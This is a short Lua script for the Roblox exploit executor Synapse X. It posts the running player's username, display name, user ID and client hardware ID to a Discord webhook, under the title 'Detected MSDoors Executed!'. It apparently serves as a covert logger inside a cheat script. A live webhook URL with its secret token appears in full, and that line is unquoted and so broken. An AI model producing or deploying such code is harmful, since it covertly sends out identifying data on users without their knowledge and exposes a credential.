local WebHook_URL = https://discord.com/api/webhooks/1046084086168567918/Zfp7AlOiD1Fg2GsbUTsxHxZnoYX7nr9phR6miOA9lAsxJ_CeWBudj19zs1wsss1B1sNu

local HttpService = game:GetService("HttpService")
local plrName = game:GetService("Players").LocalPlayer.Name
local plrDisplayName = game:GetService("Players").LocalPlayer.DisplayName
local plrUserId = game:GetService("Players").LocalPlayer.UserId
local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
local response = syn.request(
{
    Url = WebHook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "**Detected MSDoors Executed!**",
            ["description"] = "`Player Info`\n**Display Name:** " .. plrDisplayName .. "\n**Username:** " .. plrName .. "\n**User ID:** " .. plrUserId,
            ["type"] = "rich",
            ["color"] = tonumber(0xFF0000),
            ["fields"] = {
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = clientId,
                    ["inline"] = true
                }
            }
        }}
    })
}
)
